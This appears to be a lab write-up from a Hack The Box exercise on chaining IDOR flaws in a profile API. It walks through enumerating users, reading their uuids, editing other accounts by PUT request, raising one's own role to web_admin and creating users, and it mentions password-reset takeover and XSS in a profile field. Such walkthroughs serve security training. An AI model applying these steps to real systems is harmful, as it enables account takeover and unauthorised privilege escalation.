# Chaining IDOR Vulnerabilities

## Overview

A GET request to the API endpoint returns user details. The only authorization mechanism is the `role=employee` cookie—no JWT token or user-specific validation exists.

## Information Disclosure

### Retrieving Other Users' Details

Sending a GET request with a different `uid` parameter reveals another user's information:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

**Result**: IDOR Information Disclosure vulnerability confirmed. The `uuid` is now exposed.

## Modifying Other Users' Details

With the `uuid`, we can modify any user's details via a PUT request to `/profile/api.php`:

- No access control errors occur
- Changes are successfully applied
- **Potential attacks**:
  - Modify email and request password reset
  - Insert XSS payload in 'about' field

## Chaining Two IDOR Vulnerabilities

### Finding Admin Users

Enumerate all users to locate admin accounts:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

### Escalating Privileges

Modify your own user role to `web_admin` via PUT request. No validation occurs:

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

### Creating Users

With `web_admin` role, send a POST request to create new users without restrictions.

## Impact

By combining information disclosure with insecure function calls, attackers can:
- Modify/delete users
- Bypass access control checks
- Perform mass assignments (change all users' emails, inject XSS payloads)

Consider writing automation scripts to enumerate users and modify their details in bulk.
